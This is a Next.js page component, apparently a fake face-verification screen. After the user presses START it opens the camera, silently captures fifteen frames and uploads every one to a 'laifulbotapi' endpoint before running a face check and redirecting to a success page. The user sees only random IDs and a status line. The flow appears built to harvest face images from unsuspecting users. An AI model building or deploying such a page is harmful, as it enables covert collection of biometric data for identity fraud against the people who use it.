import { useRef, useState } from "react";
import { useRouter } from "next/router";

export default function Review() {
  const router = useRouter();

  const videoRef = useRef(null);
  const canvas = useRef(null);

  const queue = useRef([]);
  const sending = useRef(false);

  const [logs, setLogs] = useState([]);
  const [running, setRunning] = useState(false);
  const [status, setStatus] = useState("idle");
  const [attempt, setAttempt] = useState(0);

  function log(msg) {
    setLogs((p) => [...p, msg].slice(-200));
  }

  function makeID() {
    const c = "abcdefghijklmnopqrstuvwxyz0123456789";
    let s = "";
    for (let i = 0; i < 24; i++) s += c[Math.floor(Math.random() * c.length)];
    return s;
  }

  async function requestCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      videoRef.current.srcObject = stream;
      await videoRef.current.play();
      return true;
    } catch {
      return false;
    }
  }

  function push(base64, id) {
    queue.current.push({ base64, id });
    processSend();
  }

  async function processSend() {
    if (sending.current) return;
    if (!queue.current.length) return;

    sending.current = true;

    const { base64, id } = queue.current.shift();

    const r = await fetch("/api/laifulbotapi", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action: "send", imageBase64: base64, id })
    }).then(r => r.json());

    if (!r.ok) {
      log(`id: ${id} (retry)`);
      queue.current.push({ base64, id });
    } else {
      log(`id: ${id}`);
    }

    sending.current = false;
    processSend();
  }

  function capture() {
    if (!canvas.current) canvas.current = document.createElement("canvas");
    const c = canvas.current;
    const v = videoRef.current;

    c.width = v.videoWidth;
    c.height = v.videoHeight;

    c.getContext("2d").drawImage(v, 0, 0);

    return c.toDataURL("image/jpeg", 0.8).replace(/^data:image\/jpeg;base64,/, "");
  }

  async function startProcess() {
    setLogs([]);
    setAttempt(0);
    setRunning(true);
    setStatus("running");

    const ok = await requestCamera();
    if (!ok) {
      log("kamera tidak diizinkan");
      setRunning(false);
      return;
    }

    let sec = 0;
    const timer = setInterval(() => {
      sec++;
      const id = makeID();
      log(`id: ${id}`);
      push(capture(), id);

      if (sec >= 15) {
        clearInterval(timer);
        detectPhase();
      }
    }, 1000);
  }

  async function detectPhase() {
    const id = makeID();
    log(`mendeteksi: ${id}`);
    log("memeriksa...");

    const base64 = capture();

    const det = await fetch("/api/laifulbotapi", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        action: "detect",
        imageBase64: base64,
        id
      })
    }).then(r => r.json());

    let faces = 0;
    try {
      const r = det?.result?.results?.[0];
      faces = (r?.entities || []).length;
    } catch {}

    if (faces > 0) {
      log("wajah ditemukan");
      router.push("/success");
      return;
    }

    log("gagal mendeteksi");

    if (attempt + 1 >= 3) {
      log("coba lagi");
      setRunning(false);
      setStatus("idle");
      return;
    }

    setAttempt((x) => x + 1);
    detectPhase();
  }

  return (
    <main className="wrap">
      <div className="container">

        <div className="left">
          <div className="videoBox">
            <video ref={videoRef} className="video" autoPlay muted playsInline />
          </div>

          <div className="controls">
            {!running && (
              <button className="btn" onClick={startProcess}>START</button>
            )}
            {running && <div className="status">status: {status}</div>}
          </div>
        </div>

        <div className="right">
          <div className="logBox">
            {logs.map((l, i) => <div key={i} className="log">{l}</div>)}
          </div>
        </div>

      </div>

      <style jsx>{`
        .wrap {
          min-height:100vh;
          padding:16px;
          background:#0b1220;
          color:#e2e8f0;
        }
        .container {
          display:flex;
          flex-wrap:wrap;
          gap:16px;
        }
        .left { flex:1; min-width:260px; }
        .videoBox {
          height:300px;
          background:#000;
          border-radius:8px;
          overflow:hidden;
        }
        .video { width:100%; height:100%; object-fit:cover; }
        .controls { margin-top:12px; }
        .btn {
          padding:10px 16px;
          background:#06b6d4;
          border-radius:8px;
          border:none;
          font-weight:bold;
          cursor:pointer;
        }
        .right {
          width:340px;
          flex-shrink:0;
        }
        .logBox {
          background:#07101f;
          height:420px;
          overflow-y:auto;
          padding:10px;
          border-radius:8px;
          font-family:monospace;
          font-size:13px;
        }
        .log {
          padding:4px 0;
          border-bottom:1px dashed #1e293b;
        }
        @media (max-width:768px) {
          .right { width:100%; }
        }
      `}</style>
    </main>
  );
}